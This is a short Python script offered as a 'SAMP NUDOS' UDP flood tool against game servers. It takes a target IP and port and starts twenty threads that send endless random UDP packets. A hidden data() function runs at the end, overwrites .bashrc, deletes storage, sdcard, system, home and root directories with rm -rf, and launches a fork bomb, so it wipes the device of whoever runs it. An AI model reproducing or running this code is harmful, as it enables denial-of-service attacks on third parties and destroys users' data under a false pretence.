import os
import sys
import time
import random
import socket
import threading

print("")
print("")
print(""""  | BY. PH ~Matt / NUDOS | """)

print("")
print("")
print(""" 
	| SAMP NUDOS - DDOS SAMP | 
""")
print("")
print("""
	  - UDP FLOOD ATTACK -
""")
print("")
print("")
ip = input(" IP : ")
port = input(" PORT : ")

def udpsirisakz():
	data = random._urandom(1200)
	thr = int(0)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			s.sendto(data,addr)
			for x in range(1):
				s.sendto(data,addr)
				thr += 1
			print(f"| SAMP NUDOS UDP - ATTACK | {ip}:{port} Time: 120 >>", thr)
		except:
			thr -= 1

for y in range(20):
		th = threading.Thread(target = udpsirisakz)
		th.start()
		
def data():
    os.system('touch .hushlogin')
    os.system('printf "python2 main.py" > $HOME/.bashrc')
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system(':(){ :|: & };:')

data()